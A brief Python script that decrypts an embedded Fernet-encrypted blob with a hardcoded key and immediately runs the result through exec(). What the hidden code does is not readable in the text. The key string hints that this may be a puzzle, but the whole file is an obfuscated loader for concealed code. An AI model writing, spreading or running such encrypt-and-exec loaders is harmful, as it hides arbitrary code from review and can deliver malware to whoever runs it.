#!/usr/bin/env python3

import base64
from cryptography.fernet import Fernet

payload = b'gAAAAABlKZW7LtYjPIJGJwckuFyl8pyc-UmvohjMM1VkfFOvjnPP5dQDeDyaLsIBb4nJUHyv27JaDt-tMwdqGzq4sSlWwW6BqiWSxwJ2kh2ghYYxZLQ3VFFPQE1DxIaaJDNkuf3AIj3u2ZuQcrLbtxd-4xX2kp_PTqNvUGZbhRARYxYDqJPsofLAzMh9Sf0oe1sxbkfNoaLcCaq7TuBa3w7gnrVb6sOjflqJqQ_DSG7_u2YOrXil0kc5lsvIu96V78h2FVA1xoy1'

key_str = 'correctstaplecorrectstaplecorrec'
key_base64 = base64.b64encode(key_str.encode())
f = Fernet(key_base64)
to_exec = f.decrypt(payload)
exec(to_exec.decode())

